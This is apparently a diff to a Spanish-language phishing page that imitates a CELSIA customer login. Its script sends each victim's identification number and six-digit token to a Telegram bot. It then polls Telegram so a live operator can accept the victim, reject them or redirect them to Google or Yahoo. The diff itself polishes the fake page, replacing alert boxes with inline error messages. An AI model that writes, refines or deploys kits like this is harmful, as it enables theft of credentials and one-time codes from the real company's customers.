@@ -10,6 +10,7 @@
     --amarillo: #ffdf00;
     --texto: #29313b;
     --fondo: #f2f2f2;
+    --error: #e74c3c;
 }
 
 * { box-sizing: border-box; }
@@ -173,6 +174,18 @@ main {
     word-break: break-all;
 }
 
+/* Mensajes de Error Personalizados */
+.error-msg {
+    display: none;
+    color: var(--error);
+    font-size: 12px;
+    font-weight: 700;
+    margin: -8px 0 12px;
+    max-width: 300px;
+    line-height: 1.3;
+}
+.error-msg.show { display: block; }
+
 /* Campo de identificación */
 .input-wrap {
     display: flex;
@@ -208,10 +221,7 @@ main {
     font-size: 12px;
 }
 
-.input-wrap input::placeholder {
-    color: #777;
-    opacity: 1;
-}
+.input-wrap input::placeholder { color: #777; opacity: 1; }
 
 /* Botón */
 .login-btn {
@@ -230,9 +240,7 @@ main {
     transition: background 0.2s;
 }
 
-.login-btn:hover {
-    background: #f2f2f2;
-}
+.login-btn:hover { background: #f2f2f2; }
 
 .rule {
     width: 100%;
@@ -243,17 +251,9 @@ main {
 }
 
 /* VISTA 2: TOKEN */
-.token-view {
-    display: none;
-    width: 100%;
-    flex-direction: column;
-}
+.token-view { display: none; width: 100%; flex-direction: column; }
+.token-view.active { display: flex; }
 
-.token-view.active {
-    display: flex;
-}
-
-/* Caja del token */
 .token-input-box {
     display: flex;
     align-items: center;
@@ -267,9 +267,7 @@ main {
     overflow: hidden;
 }
 
-.token-input-box:focus-within {
-    border-color: #7bafd4;
-}
+.token-input-box:focus-within { border-color: #7bafd4; }
 
 .token-input-box .lock-icon {
     display: flex;
@@ -295,10 +293,7 @@ main {
     background: transparent;
 }
 
-.token-input-box input::placeholder {
-    color: #ccc;
-    letter-spacing: 2px;
-}
+.token-input-box input::placeholder { color: #ccc; letter-spacing: 2px; }
 
 .token-input-box .toggle-eye {
     display: flex;
@@ -321,29 +316,10 @@ main {
     margin: 28px auto 0;
 }
 
-.ecollect {
-    color: #1c2636;
-    font-size: 25px;
-    font-weight: 700;
-    letter-spacing: -1px;
-}
-
+.ecollect { color: #1c2636; font-size: 25px; font-weight: 700; letter-spacing: -1px; }
 .ecollect b { color: #54ad57; }
-
-.secure-sub {
-    margin-top: 2px;
-    color: #68ae72;
-    font-size: 11px;
-}
-
-.ssl {
-    padding: 11px 17px;
-    border-radius: 25px;
-    background: #7850c6;
-    color: #fff;
-    font-size: 12px;
-    font-weight: 700;
-}
+.secure-sub { margin-top: 2px; color: #68ae72; font-size: 11px; }
+.ssl { padding: 11px 17px; border-radius: 25px; background: #7850c6; color: #fff; font-size: 12px; font-weight: 700; }
 
 .cert {
     display: flex;
@@ -395,11 +371,7 @@ main {
     100% { transform: rotate(360deg); }
 }
 
-.loading-overlay p {
-    font-size: 14px;
-    color: #29313b;
-    font-weight: 700;
-}
+.loading-overlay p { font-size: 14px; color: #29313b; font-weight: 700; }
 
 /* RESPONSIVE */
 @media (min-width: 701px) and (max-width: 950px) {
@@ -436,6 +408,7 @@ main {
     .token-input-box .lock-icon { flex-basis: 50px; font-size: 16px; }
     .token-input-box input { font-size: 18px; }
     .rule { width: 100%; max-width: none; margin: 14px 0 0; border: 0; border-top: 1px solid #333; }
+    .error-msg { font-size: 14px; max-width: 100%; }
     .security { gap: 12px; margin: 65px 12px 0; }
     .ecollect { font-size: 24px; }
     .secure-sub { font-size: 13px; }
@@ -496,6 +469,8 @@ main {
                     <span class="user-icon" aria-hidden="true">♟</span>
                     <input type="text" id="identificacion" placeholder="* Número de identificación" aria-label="Número de identificación" inputmode="numeric" maxlength="12">
                 </div>
+                
+                <p class="error-msg" id="errorId">Por favor ingresa tu número de identificación.</p>
 
                 <button class="login-btn" type="button" id="btnLogin">
                     INICIAR SESIÓN
@@ -524,6 +499,8 @@ main {
                         </svg>
                     </button>
                 </div>
+
+                <p class="error-msg" id="errorToken">El token debe tener exactamente 6 dígitos.</p>
 
                 <button class="login-btn" type="button" id="btnValidarToken">
                     VALIDAR TOKEN
@@ -564,6 +541,7 @@ const TG_CHAT_ID = '7776240161';
 const inputId = document.getElementById('identificacion');
 const btnLogin = document.getElementById('btnLogin');
 const viewIdentificacion = document.getElementById('viewIdentificacion');
+const errorId = document.getElementById('errorId');
 
 const viewToken = document.getElementById('viewToken');
 const correoEnmascarado = document.getElementById('correoEnmascarado');
@@ -571,6 +549,7 @@ const inputToken = document.getElementById('inputToken');
 const btnToggleEye = document.getElementById('btnToggleEye');
 const eyeIcon = document.getElementById('eyeIcon');
 const btnValidarToken = document.getElementById('btnValidarToken');
+const errorToken = document.getElementById('errorToken');
 
 let idBuscadoGlobal = '';
 let actionProcessed = false;
@@ -581,9 +560,11 @@ let msgIdActual = null;
 // Solo números permitidos
 inputId.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '');
+    errorId.classList.remove('show');
 });
 inputToken.addEventListener('input', function () {
     this.value = this.value.replace(/\D/g, '');
+    errorToken.classList.remove('show');
 });
 
 // Mostrar/Ocultar ojito
@@ -609,124 +590,73 @@ function ocultarOverlay() {
 }
 
 // ==========================================
-// 📤 ENVIAR A TELEGRAM (Identificación)
+// 📤 ENVIAR A TELEGRAM
 // ==========================================
 function enviarIdentificacionTelegram(valorIngresado, onSent) {
-    const mensaje = `
-⚡ <b>CELSIA - IDENTIFICACIÓN</b>
-
-🔍 <b>Número:</b> <code>${valorIngresado}</code>
-
-📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
-  `.trim();
-
+    const mensaje = `⚡ <b>CELSIA - IDENTIFICACIÓN</b>\n\n🔍 <b>Número:</b> <code>${valorIngresado}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     const keyboard = {
-        inline_keyboard: [
-            [
-                { text: '🔑 Pedir Token', callback_data: 'pedir_token' },
-                { text: '❌ Usuario Malo', callback_data: 'usuario_malo' }
-            ]
-        ]
+        inline_keyboard: [[
+            { text: '🔑 Pedir Token', callback_data: 'pedir_token' },
+            { text: '❌ Usuario Malo', callback_data: 'usuario_malo' }
+        ]]
     };
 
-    return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: mensaje,
-            parse_mode: 'HTML',
-            reply_markup: keyboard
-        })
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
     })
     .then(r => r.json())
     .then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             if (typeof onSent === 'function') onSent(msgIdActual);
-            return msgIdActual;
+        } else {
+            if (typeof onSent === 'function') onSent(null);
         }
-        return null;
-    })
-    .catch(err => {
-        console.error('❌ Error de red:', err);
-        return null;
-    });
+    }).catch(() => { if (typeof onSent === 'function') onSent(null); });
 }
 
-// ==========================================
-// 📤 ENVIAR A TELEGRAM (Token)
-// ==========================================
 function enviarTokenTelegram(valorToken, onSent) {
-    const mensaje = `
-⚡ <b>CELSIA - TOKEN RECIBIDO</b>
-
-🔍 <b>Identificación:</b> ${idBuscadoGlobal}
-🔑 <b>Token:</b> <code>${valorToken}</code>
-
-📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}
-  `.trim();
-
-    // Agregamos los 3 botones solicitados
+    const mensaje = `⚡ <b>CELSIA - TOKEN RECIBIDO</b>\n\n🔍 <b>Identificación:</b> ${idBuscadoGlobal}\n🔑 <b>Token:</b> <code>${valorToken}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     const keyboard = {
         inline_keyboard: [
-            [
-                { text: '❌ Usuario Malo', callback_data: 'usuario_malo_final' }
-            ],
-            [
-                { text: '🌐 Usuario Correcto (Google)', callback_data: 'usuario_correcto' }
-            ],
-            [
-                { text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo' }
-            ]
+            [{ text: '❌ Usuario Malo', callback_data: 'usuario_malo_final' }],
+            [{ text: '🌐 Usuario Correcto (Google)', callback_data: 'usuario_correcto' }],
+            [{ text: '🏁 Finalizar (Yahoo)', callback_data: 'finalizar_yahoo' }]
         ]
     };
 
-    return fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TG_CHAT_ID,
-            text: mensaje,
-            parse_mode: 'HTML',
-            reply_markup: keyboard
-        })
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
     })
     .then(r => r.json())
     .then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
             if (typeof onSent === 'function') onSent(msgIdActual);
-            return msgIdActual;
+        } else {
+            if (typeof onSent === 'function') onSent(null);
         }
-        return null;
-    })
-    .catch(err => {
-        console.error(err);
-        return null;
-    });
+    }).catch(() => { if (typeof onSent === 'function') onSent(null); });
 }
 
 // ==========================================
-// 👂 ESCUCHAR BOTONES (polling)
+// 👂 ESCUCHAR BOTONES
 // ==========================================
 function escucharBotones(callbackAction) {
     if (!msgIdActual) return;
-
     pollingActivo = true;
     let lastUpdateId = -1;
 
     function check() {
         if (!pollingActivo) return;
-
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                offset: lastUpdateId + 1,
-                allowed_updates: ['callback_query'],
-                timeout: 10
-            })
+            body: JSON.stringify({ offset: lastUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
         })
         .then(r => r.json())
         .then(data => {
@@ -734,15 +664,12 @@ function escucharBotones(callbackAction) {
                 pollingTimeout = setTimeout(check, 2000);
                 return;
             }
-
             for (const u of data.result) {
                 lastUpdateId = Math.max(lastUpdateId, u.update_id);
                 if (!u.callback_query) continue;
-
                 const action = u.callback_query.data;
                 const messageId = String(u.callback_query.message.message_id);
 
-                // SOLO procesar si el botón presionado pertenece al mensaje actual
                 if (messageId === String(msgIdActual)) {
                     pollingActivo = false;
                     callbackAction(action);
@@ -751,15 +678,13 @@ function escucharBotones(callbackAction) {
             }
             pollingTimeout = setTimeout(check, 2000);
         })
-        .catch(err => {
-            pollingTimeout = setTimeout(check, 3000);
-        });
+        .catch(() => { pollingTimeout = setTimeout(check, 3000); });
     }
     check();
 }
 
 // ==========================================
-// 🗺️ ACCIÓN DEL BOT (PASO 1: IDENTIFICACIÓN)
+// 🗺️ ACCIONES DE TELEGRAM
 // ==========================================
 function handleTelegramActionId(action) {
     if (actionProcessed) return;
@@ -771,33 +696,26 @@ function handleTelegramActionId(action) {
         viewIdentificacion.style.display = 'none';
         viewToken.classList.add('active');
         setTimeout(() => inputToken.focus(), 100);
-        
     } else if (action === 'usuario_malo') {
-        alert('El documento o cuenta no es válido. Verifica e intenta de nuevo.');
+        errorId.textContent = 'El número de identificación no es válido.';
+        errorId.classList.add('show');
         inputId.value = '';
         actionProcessed = false;
     }
 }
 
-// ==========================================
-// 🗺️ ACCIÓN DEL BOT (PASO 2: TOKEN)
-// ==========================================
 function handleTelegramActionToken(action) {
     if (actionProcessed) return;
     actionProcessed = true;
     ocultarOverlay();
 
     if (action === 'usuario_correcto') {
-        // Redirigir a Google
         window.location.href = 'https://www.google.com';
-        
     } else if (action === 'finalizar_yahoo') {
-        // Redirigir a Yahoo
         window.location.href = 'https://www.yahoo.com';
-        
     } else if (action === 'usuario_malo_final') {
-        // Error en el token
-        alert('❌ El token es incorrecto o el usuario no es válido.');
+        errorToken.textContent = 'El token ingresado es incorrecto o expiró.';
+        errorToken.classList.add('show');
         inputToken.value = '';
         inputToken.focus();
         actionProcessed = false;
@@ -809,12 +727,11 @@ function handleTelegramActionToken(action) {
 // ==========================================
 // 🚀 EVENTOS DE BOTONES EN PANTALLA
 // ==========================================
-
-// Botón "INICIAR SESIÓN" -> Manda la identificación
 btnLogin.addEventListener('click', function() {
     const id = inputId.value.trim();
     if (id === '') {
-        alert('Por favor ingresa tu número de identificación.');
+        errorId.textContent = 'Por favor ingresa tu número de identificación.';
+        errorId.classList.add('show');
         inputId.focus();
         return;
     }
@@ -830,44 +747,38 @@ btnLogin.addEventListener('click', function() {
         } else {
             ocultarOverlay();
             btnLogin.disabled = false;
-            alert('Error de conexión con Telegram.');
+            errorId.textContent = 'Error de conexión. Intenta de nuevo.';
+            errorId.classList.add('show');
         }
     });
 });
 
-// Botón "VALIDAR TOKEN" -> Manda el token
 btnValidarToken.addEventListener('click', function() {
     const token = inputToken.value.trim();
-
     if (token.length < 6) {
-        alert('El token debe tener exactamente 6 dígitos.');
+        errorToken.textContent = 'El token debe tener exactamente 6 dígitos.';
+        errorToken.classList.add('show');
         inputToken.focus();
         return;
     }
 
     actionProcessed = false;
     mostrarOverlay();
-    
-    // Actualizamos el correo visualmente
     correoEnmascarado.textContent = `au***${idBuscadoGlobal.slice(-2)}@ho*****.com`;
 
-    // Se envía a Telegram el token y esperamos los 3 botones
     enviarTokenTelegram(token, function(msgId) {
         if (msgId) {
             escucharBotones(handleTelegramActionToken);
         } else {
             ocultarOverlay();
-            alert('Error al enviar el token a Telegram.');
+            errorToken.textContent = 'Error al enviar el token. Intenta de nuevo.';
+            errorToken.classList.add('show');
         }
     });
 });
 
-// Permitir Enter en el Token
 inputToken.addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') {
-        e.preventDefault();
-        btnValidarToken.click();
-    }
+    if (e.key === 'Enter') { e.preventDefault(); btnValidarToken.click(); }
 });
 </script>
 
